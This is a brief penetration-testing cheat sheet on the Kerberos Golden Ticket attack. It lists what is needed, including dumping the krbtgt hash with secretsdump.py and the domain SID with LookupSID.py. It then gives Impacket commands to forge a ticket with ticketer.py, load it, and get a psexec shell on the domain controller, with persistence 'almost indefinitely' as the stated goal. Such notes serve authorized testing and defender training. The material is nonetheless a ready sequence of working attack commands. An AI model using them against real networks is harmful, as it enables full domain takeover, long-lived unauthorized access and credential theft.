---
description: >-
  A Golden Ticket attack is a type of attack in which an adversary gains control
  over an Active Directory Key Distribution Service Account (KRBTGT), and uses
  that account to forge valid Kerberos Tickets
---

# Create Golden Ticket

This attack will allow you to persist in an environment almost indefinitely.

**Requirements:**

* Impacket

## Prerequisites for creating a Golden Ticket:

1. The NT hash of the `krbtgt` account. This can be obtained from running `secretsdump.py` on the Domain Controller.
2. Domain SID. This can be obtained by using `LookupSID.py` on the Domain Controller.
3. Domain name. This can be gathered by querying it on the Domain Controller or will have been gathered throughout the penetration test.
4. Username to impersonate. This should be a valid user on the domain.

## Creating a Golden Ticket on Linux with Impacket

Use ticket.py to customize, sign, and save the ticket:\
`ticketer.py -nthash [NTHASH] -domain-sid [SID] -domain [DOMAIN] [USER]`

Export the ticket:\
`export KRB5CCNAME=[USER.CCACHE]`

Authenticate with the created ticket to the domain controller:\
`psexec.py [DOMAIN]/[USER]@[HOST] -k -no-pass -dc-ip [DOMAINCONTROLLER]`

## References

* [Microsoft Active Directory Golden Ticket Attacks Explained](https://www.qomplx.com/qomplx-knowledge-golden-ticket-attacks-explained/)
